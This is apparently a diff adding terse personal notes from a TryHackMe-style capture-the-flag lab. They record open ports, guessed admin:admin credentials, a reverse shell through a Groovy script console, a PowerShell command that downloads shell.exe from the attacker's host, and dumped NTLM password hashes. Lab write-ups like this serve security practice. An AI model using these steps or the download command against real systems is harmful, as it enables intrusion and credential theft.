@@ -1,0 +1,39 @@
+10.10.143.248
+
+
+//creds
+admin:admin
+
+
+80/tcp   open  http
+	
+	alfred@wayneenterprises.com 
+	Bruce Wayne
+	Bruce.jpg
+	//
+	Gobuster
+	//
+	Nikto
+
+3389/tcp open  ms-wbt-server
+8080/tcp open  http-proxy
+
+	http://alfred.thm:8080/login?from=%2F
+	default creds admin:password - unsuccessful
+	got lucky with admin:admin
+	
+	(As per "Internal THM) 
+	Script Console > reverse shell in Groovey Script
+		// changed cmd to "cmd.exe"
+
+Shell
+
+	C:\Users\bruce\Desktop>more user.txt
+	 C:\Windows\System32\config>more root.txt
+
+	
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.177.195:8000/shell.exe','shell.exe')"
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee31d6cfe0d16ae931b73c59d7e0c089c0:::
+bruce:1000:aad3b435b51404eeaad3b435b51404ee3ea0013c7eb26d63606673c34322b4ae:::
